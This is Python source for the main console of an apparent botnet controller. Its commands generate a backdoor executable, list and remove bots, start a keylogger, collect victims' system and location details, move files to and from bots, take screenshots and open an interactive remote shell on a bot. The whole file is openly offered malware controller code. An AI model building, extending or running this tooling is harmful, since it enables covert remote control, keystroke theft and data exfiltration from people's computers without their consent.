# Date: 09/30/2017
# Author: Ethical-H4CK3R
# Description: Main Console

import os
import time
import json

from cmd2 import Cmd
from subprocess import Popen

class MainController(Cmd):
 ''' Control the main program '''

 def __init__(self):
  Cmd.__init__(self)
  Popen('clear'.split()).wait()
  if not os.path.exists('/tmp/msg'):
   with open('/tmp/msg','w') as f:pass
   print '\n[-] Enter help for help\n[-] Enter help [CMD_NAME] for more detail'''

 # Basic commands
 def do_setip(self, arg=None):
  ''' \rDescription: Assign the IP to host the server\nUsage: setip [IP] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkIP(arg[0]):return
  self.ip = arg[0]

 def do_setport(self, arg=None):
  ''' \rDescription: Assign the port to host the server\nUsage: setport [PORT] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkPORT(arg[0]):return   
  self.port = eval(arg[0])

 def do_create(self, arg=None):
  ''' \rDescription: Create a backdoor\nUsage: create [IP] [PORT] [NAME] '''
  arg = arg.split()
  if not self.checkArg(arg, 3):return  
  if not self.checkIP(arg[0]):return
  if not self.checkPORT(arg[1]):return
  if not self.checkName(arg[2]):return
  self.createBot(arg[0], arg[1], os.path.splitext(arg[2])[0])
  Popen('clear'.split()).wait()
  print 'Backdoor Created Successfully' if \
  os.path.exists(os.path.splitext(arg[2])[0]+'.exe') else '[-] Error: Backdoor Creation Failed' 
  
 def do_remove(self, arg=None):
  ''' \rDescription: Remove a bot from botnet (Permanently)\nUsage: remove [ID] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]   
  self.sendData(bot.session, self.struct(1))
  self.killBot(bot)

 def do_chrome(self, arg=None):
  ''' \rDescription: Launch chrome & open unlimited amount of tabs\nUsage: chrome [ID] [URL1] [URL2] [URLn]'''
  arg = arg.split()
  if not self.checkID(arg[0]):return
  if not self.checkArg(arg, min=2):return
  self.sendData(self.botnet[eval(arg[0])-1].session, self.struct(97, arg[1:]))     

 def do_shutdown(self, arg=None):
  ''' \rDescription: Shutdown a bot\nUsage: shutdown [ID] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]   
  self.sendData(bot.session, self.struct(96))
  self.killBot(bot)
   
 # Botnet commands   
 def do_botnet(self, arg=None):
  ''' \rDescription: Display a list of connected bots\nUsage: botnet '''
  self.display()
  
 # Bot commands
 def do_kill(self, arg=None):
  ''' \rDescription: Kill the connection to a bot (Connects back a later time)\nUsage: kill [ID] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]
  self.sendData(bot.session, self.struct(0))
  self.killBot(bot)
 
 def do_reset(self, arg=None):
  ''' \rDescription: Reset the connection to a bot\nUsage: reset [ID] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  self.killBot(self.botnet[eval(arg[0])-1])

 def do_keylogger(self, arg=None):
  ''' \rDescription: Keylogger\nUsage: keylogger [ID] [START|STOP|DUMP|REMOVE] '''
  arg = arg.split()
  if not self.checkArg(arg, 2):return
  if not self.checkID(arg[0]):return
  self.keylogger(arg[0], arg[1])

 def do_getinfo(self, arg=None):
  ''' \rDescription: Display the personal information of a bot\nUsage: getinfo [ID] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  self.system(arg[0]) # sys
  self.location(arg[0]) # geo
         
 def do_upload(self, arg=None):
  ''' \rDescription: Upload a file to a bot (Uploaded to C:\System)\nUsage: upload [ID] [PATH]'''
  arg = arg.split()
  if not self.checkArg(arg, min=2):return
  if not self.checkID(arg[0]):return
  self.upload(self.botnet[eval(arg[0])-1], ' '.join(arg[1:])) 
      
 def do_download(self, arg=None):
  ''' \rDescription: Download a file from a bot\nUsage: download [ID] [PATH]'''
  arg = arg.split()
  if not self.checkArg(arg, min=2):return
  if not self.checkID(arg[0]):return
  self.download(self.botnet[eval(arg[0])-1], ' '.join(arg[1:])) 
  
 def do_screenshot(self, arg=None):
  ''' \rDescription: Screenshot of a bot\nUsage: screenshot [ID] '''  
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  self.download(self.botnet[eval(arg[0])-1], num=100)
  
 def do_shell(self, arg=None):
  ''' \rDescription: Open an interactive shell\nUsage: shell [ID] '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]     
  try:
   self.sendData(bot.session, self.struct(101))
   host = bot.system['Username'] if bot.system else 'UNKNOWN'
   ip = bot.location['Ip'] if bot.location else 'UNKNOWN'
   host = host if host else 'UNKNOWN'
   ip = ip if ip else 'UNKNOWN'      
   self.shell(bot, self.getprompt(ip, host, True))
  except:pass 

 # Server commands
 def do_server_start(self, arg=None):
  ''' \rDescription: Start the server\nUsage: server_start '''
  self.startServer()
   
 def do_server_stop(self, arg=None):
  ''' \rDescription: Stop the server\nUsage: server_stop '''
  self.stopServer() 

 def do_server_restart(self, arg=None):
  ''' \rDescription: Restart the server\nUsage: server_restart '''
  self.restartServer()

 def do_server_info(self, arg=None):
  ''' \rDescription: Display information about the server\nUsage: server_status '''
  running = '\n[-] Last Active On: {}:{}'.format(self.activeIP, self.activePort) 
  connections = '\n[-] Connections: {}'.format(len(self.botnet))

  print '\n[-] Port: {}\n[-] IP: {}\n[-] Active: {}{}{}\n\
        '.format(self.port, 
                  self.ip, 
                   self.server_status, 
                     connections if self.server_status else '', 
                      running if self.server_status else '')                
